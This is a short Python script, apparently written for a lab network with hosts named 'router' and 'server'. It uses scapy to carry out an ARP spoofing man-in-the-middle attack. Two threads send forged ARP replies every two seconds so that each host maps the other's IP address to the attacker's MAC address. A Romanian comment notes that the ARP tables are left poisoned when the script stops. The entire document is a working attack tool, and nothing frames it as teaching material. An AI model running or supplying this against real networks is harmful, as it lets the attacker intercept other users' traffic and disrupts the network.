import time, threading, socket
from scapy.all import ARP, send, conf, get_if_hwaddr

ROUTER = "router"
SERVER = "server"

def resolve(host):
    return socket.gethostbyname(host)

def init():
    router_ip = resolve(ROUTER)
    server_ip = resolve(SERVER)
    iface = conf.iface
    mac = get_if_hwaddr(iface) #Ex: "08:00:27:53:8b:dc"
    print(f"[i] router_ip={router_ip} server_ip={server_ip} middle_mac={mac} iface={iface}")
    return router_ip, server_ip, mac

router_ip, server_ip, middle_mac = init()

def poison(psrc, pdst):
    pkt = ARP(op=2, psrc=psrc, hwsrc=middle_mac, pdst=pdst)
    while True:
        send(pkt, verbose=False)
        time.sleep(2)

# Router -> server = MAC middle
threading.Thread(target=poison, args=(server_ip, router_ip), daemon=True).start()
# Server -> router = MAC middle
threading.Thread(target=poison, args=(router_ip, server_ip), daemon=True).start()

print("[i] ARP poisoning running...")
try:
    while True:
        time.sleep(5)
except KeyboardInterrupt:
    print("[i] Stopping (nu restaurăm ARP aici).")
